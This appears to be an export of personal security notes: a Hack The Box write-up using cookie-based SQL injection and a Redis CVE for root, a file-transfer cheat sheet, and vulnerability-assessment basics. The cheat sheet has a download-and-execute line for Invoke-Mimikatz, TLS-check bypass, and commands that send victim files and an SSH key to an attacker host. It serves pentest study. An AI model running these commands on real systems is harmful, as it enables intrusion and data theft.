nothing out of the ordinary on the first sight.\n\nWebsite uses presta shop, check for vuln. An SQL injection is possible one of the query parameters. However, this is hardly exploitable.\n\nUpon browsing the site and trying to buy some stuff. We are redirected on checkout to another website: `checkout.shared.htb`.\n\n## User\nAfter some digging using burp. We can see that not only the website sets some custom cookies in JSON format but also that the content of the cookie vulnerable to  SQL injection.\n\nWe can confirm that by changing the value of the cookie from `{\"XHFG\":\"1\"}` to `{\"XH\" + \"FG\" : \"1\"}` and the website still works properly.\n\nFrom there it's guessing and sqlmap time...\nAfter some time, we can see that the first parameter is UNION vulnerable. We can use it to disclose informations about the db `checkout` using:\n```\n{\"AAAAA' and 0=1 union select 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='checkout'-- -\":\"1\"}\n\t\u003e user\t\n{\"AAAAA' and 0=1 union select 1, username, password from checkout.user-- -\":\"1\"}\n\t\u003e james_mason\n{\"AAAAA' and 0=1 union select 1, password, username from checkout.user-- -\":\"1\"}\n\t\u003e fc895d4eddc2fc12f995e18c865cf273\n```\n\n## LPE\nlinPEAS tells us that the file `redis_connector_dev` is unsual, doesn't belong here.\nthe file is a compiled go executable that connects to a local redis instance on port 6379.\n\nTrying to RE using cutter =\u003e No use, to complicated. There has to be a simpler way.\nLets try to emulate a redis db by listening to 6379 on localhost and run the app.\n\n```\n\u003e nc -lnvp 6379\n\u003e ./redis_connector_dev # from another shell\n\nlistening on [any] 6379 ...  \nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42250  \n*2  \n$4  \nauth  \n$16  \nF2WHqJUz2WEz=Gqq\n```\nCool, we get the redis password. \n\nA simple check with `ps -ef |grep redis` can show us that redis is run as root. Let's try to abuse it.\n\u003e Thx hacktriks \n\u003e https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis\n\nOne cool trick that might work would be the [LUA sanbox bypass](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass), as it is the CVE-2022-0543 and the version of Redis (6.0.15) is vulnerable. \n\nUsing this wonderful tool: https://github.com/aodsec/CVE-2022-0543 we get an easy root !\n\nAAAAAAAAAAAAAAAA","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/HackTheBox":{"title":"SecNotes - HTB","content":"\nWriteups on retired machines, sorted by difficulty\n\n## [Easy](HTB/Easy/Easy.md)\n## [Medium](HTB/Medium/Medium.md)\n## [Hard](HTB/Hard/Hard.md)\n## Insane\n\u003e Woa much empty","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/Notes/File-Transfers":{"title":"SecNotes - File Transfers","content":"\n## Downloads\n### Base64\n\n```bash {title=\"Attacker\"}\n/workspace root@exegol-CTFs\n❯ cat .ssh/id_rsa | base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVE\u003csnip\u003eSCBQUklWQVRFIEtFWS0tLS0tCg==\n```\n\n```powershell {title=\"Victim (Windows)\"}\nPS C:\\Temp\u003e [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVE\u003csnip\u003eSCBQUklWQVRFIEtFWS0tLS0tCg==\"))\n```\n\n```bash {title=\"Victim (Linux)\"}\n❯ echo \"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVE\u003csnip\u003eSCBQUklWQVRFIEtFWS0tLS0tCg==\" |base64 -d \u003e /home/user/.ssh/id_rsa\n```\n\n### PowerShell Web Downloads\n\nMultiple WebClient methods for downloading data from a remote\n\n| Method | Desc |\n|----------|-------|\n| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)| Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |\n|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|\n|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|\n|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|\n|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|\n|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|\n|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|\n|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|\n\n```powershell {title=Net.WebClient.DownloadFile}\nPS C:\\Temp\u003e (New-Object Net.WebClient).DownloadFile('\u003cTarget URL\u003e','\u003cOutput\u003e')\n```\n\n```powershell {title=\"NetWebClient.DownloadString - Download \u0026 Execute, curl2bash like\"}\nPS C:\\Temp\u003e (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n```\n\n\u003e [!NOTE]  [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) and its aliases (iwr, curl and wget) can be used to download file with PS 3.0 ownwards but it's noticeably slower\n\n```powershell {title=\"Bypass Untrusted SSL/TLS Certificate Warning\"}\nPS C:\\Temp [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n```\n\n### SMB\n\n\u003e [!HINT] Impackets smbserver is available out of the box in exegol !\n\n```bash {title=\"Creating an SMB Server using impacket-smbserver\"}\n❯ smbserver.py share -smb2support /tmp/smbshare\nImpacket for Exegol - v0.10.1.dev1+20230303.141054.8975ed2d - Copyright 2022 Fortra - forked by ThePorgs\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n```powershell {title=\"Accessing the share without authentication\"}\nPS C:\\User\\Desktop\u003e copy \\\\192.168.61.130\\share\\pwned\nPS C:\\User\\Desktop\u003e ls\nMode           LastWriteTime         Length Name\n----           -------------         ------ ----\n-a----         20-Aug-23 11:06       0      pwned\n```\n\n\u003e [!INFO] Creating an SMB Server with Username and Password\n\u003e \n\u003e - Create the server\n\u003e ```bash\n\u003e ❯ smbserver.py share -smb2support /tmp/smbshare -user bob -password bob\n\u003e ```\n\u003e- Mount the share\n\u003e ```powershell\n\u003e\tC:\\User\\Desktop\u003e net use z: \\\\192.168.61.130\\share /user:bob password\n\u003e ```\n\u003e - Access the file\n\u003e ```powershell\n\u003e \tC:\\User\\Desktop\u003e copy z:\\pwned\n\u003e ```\n### FTP\n\n\u003e [!HINT] pyftpdlib python library is available out of the box in exegol !\n\n```bash {title=\"Setting up ftp server using pyftpdlib python lib\"}\n❯ python3 -m pyftpdlib -p 21\n[I 2023-08-20 12:56:17] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=1113 \u003c\u003c\u003c\n[I 2023-08-20 12:56:17] concurrency model: async\n[I 2023-08-20 12:56:17] masquerade (NAT) address: None\n[I 2023-08-20 12:56:17] passive ports: None\n```\n\n#### Using PowerShell\n\n```powershell {title=\"Victim (Windows)\"}\nC:\\User\\Desktop\u003e (New-Object Net.WebClient).DownloadFile('ftp://192.168.61.130/pwned', 'pwned')\n```\n\n#### Using FTP client\n\n1. Using a file containing commands\n```powershell {title=\"Victim (Windows)\"}\nC:\\User\\Desktop\u003e cat ftpcmd\nopen 192.168.61.130\nUSER anonymous\nGET pwned\nbye\n\nC:\\User\\Desktop\u003e ftp -v -n -s:ftpcmd\n```\n\n2. Using the CLI directly\n```powershell {title=\"Victim (Windows)\"}\nC:\\User\\Desktop\u003e ftp\nftp\u003e open 192.168.61.130\nftp\u003e USER anonymous\nftp\u003e GET pwned\nftp\u003e bye\n```\n\n## Uploads\n\n### Base64\n\n```powershell {title=\"Victim (Windows)\"}\nPS C:\\Users\\bob\u003e [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=\n```\n\n### Shell Web Uploads\n\nSome cool programs to get a small webserver with upload capabilities:\n1. `uploadserver` as a python module (source code [here](https://github.com/Densaugeo/uploadserver))\n2. `updog` (source code [here](https://github.com/sc0tfree/updog))\n\n\u003e Following example are shown with `uploadserver`\n\nUseful powershell script to upload a file to a webserver : https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1\n\n```powershell {title=\"Victim (Windows)\"}\nPS C:\\Users\\bob\u003e IEX(New-Object Net.WebClient).DownloadString('http://192.168.61.130/PSUpload.ps1')\nPS C:\\Users\\bob\u003e Invoke-FileUpload -Uri http://192.168.61.130/upload -File \u003cfile path\u003e\n```\n\nAnother way to exfiltrate a file is to convert its content to base64 and sending it either via post body or via url path:\n\n```powershell {title=\"Victim (Windows)\"}\nPS C:\\Users\\bob\u003e $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\Users\\bob\u003e curl http://192.167.61.130 -Method POST -Body $b64\nPS C:\\Users\\bob\u003e curl \"http://192.168.61.130/ + $b64\"\n```\n\n```bash {title=\"Attacker (Linux)\"}\n❯ nc -lnvp 80\nNcat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Listening on :::80\nNcat: Listening on 0.0.0.0:80\nNcat: Connection from ::1.\nNcat: Connection from ::1:48330.\nPOST / HTTP/1.1\nHost: localhost\nUser-Agent: curl/7.74.0\nAccept: */*\nContent-Length: 1101\nContent-Type: application/x-www-form-urlencoded\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=m\n\n❯ python3 -m uploadserver 80\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n127.0.0.1 - - [20/Aug/2023 20:49:06] \"GET /IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= HTTP/1.1\" 404 -\n```\n\n### SMB\n\n⚠️ WIP - Docs in progress ⚠️","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/Notes/Notes":{"title":"SecNotes - Notes \u0026 bits","content":"\n- [Vulnerability Assessment](\u003cNotes/Vulnerability Assessment.md\u003e)\n- [File Transfers](\u003cNotes/File Transfers.md\u003e)\n","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null},"/Notes/Vulnerability-Assessment":{"title":"SecNotes - Vulnerability Assessment","content":"\n## Methodology\n\n8 steps:\n1. Conduct Risk Identification And Analysis\n2. Develop Vulnerability Scanning Policies\n3. Identity The Type Of Scans\n4. Configure And Perform The Scan\n5. Evaluate And Consider Possible Risks\n6. Interpret The Scan Results\n\t1. Prioritize vulns with public exploit (CVEs and such) over vulns that needs more scripting and setup\n7. Create A Remediation \u0026 Mitigation Plan\n\t1. Inform and delegate\n\n![vulnerability_mectrics](Notes/assets/vulnerability_mectrics.png)\n\n## Terms\n\n### Vulnerability\nWeakness or bug in an organization's env, including applications, networks, and infrastructure. Can get a [CVE](https://cve.mitre.org) through MITRE's framework and are graded using the [Common Vulnerability Scoring System (CVSS)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator).\n### Threat\nProcess that amplifies the potential of an adverse event, such as a threat actors exploiting a vuln.\n### Exploit\nBit of code or resources that can be used to take advantage of an asset's weakness.\nSome sources of public exploits : \n- https://exploitdb.com\n- https://www.rapid7.com/db/\n- https://github.com/trickest/cve\n### Risk \n\u003e ISO 31000 states that Risk is  \"the **effect** of **uncertainty** on **objectives**\"\n\nA definition of Risk could be the possibility of assets or data being harmed or destroyed by threat actors.\n```mermaid\nflowchart LR\n\nA[Uncertainty] --------\u003e B[Objectives]\nB[Objectives] --------\u003e C[Effect]\n\n\n```\n\n## Assessment Standards\n\n### [ISO 27001](https://www.iso.org/isoiec-27001-information-security.html)\n\nWorldwide standard to manage information security. It requires orgs to perform quarterly external and internal scans. Most of the time in organizations, the [CISO](https://www.cisco.com/c/en/us/products/security/what-is-ciso.html#:~:text=A%20CISO%2C%20or%20chief%20information,policies%20to%20protect%20critical%20data) ensure compliance to this norm.   \n\n\u003e [!WARNING]\n\u003e Although compliance is essential, it should not drive a vulnerability management program\n\n\n\u003e [!info]- About [ISO 27001](https://www.cisco.com/c/en/us/products/security/what-is-ciso.html#:~:text=A%20CISO%2C%20or%20chief%20information,policies%20to%20protect%20critical%20data.)\n\u003e \n\u003e ISO/IEC 27001 is the world's best-known standard for **information security management systems (ISMS)**. It defines requirements an ISMS must meet.\n\u003e\n\u003e The ISO/IEC 27001 standard provides companies of any size and from all sectors of activity with guidance for establishing, implementing, maintaining and continually improving an information security management system.\n\u003e \n\u003e Conformity with ISO/IEC 27001 means that an organization or business has put in place a system to manage risks related to the security of data owned or handled by the company, and that this system respects all the best practices and principles enshrined in this International Standard.\n\n## Common Vulnerabilities and Exposures (CVE)\n\nSet of criteria needed to be met to qualify for a CVE ID:\n1. Independently Fixable\n2. Affecting One Codebase\n\t1. Flaws that impact more than one product get separate CVEs\n3. Acknowledged By The Vendor And Documented\n\t1. Vendor acknowledgement\n\n\n\n","lastmodified":"2023-08-21T11:55:44.167435053Z","tags":null}}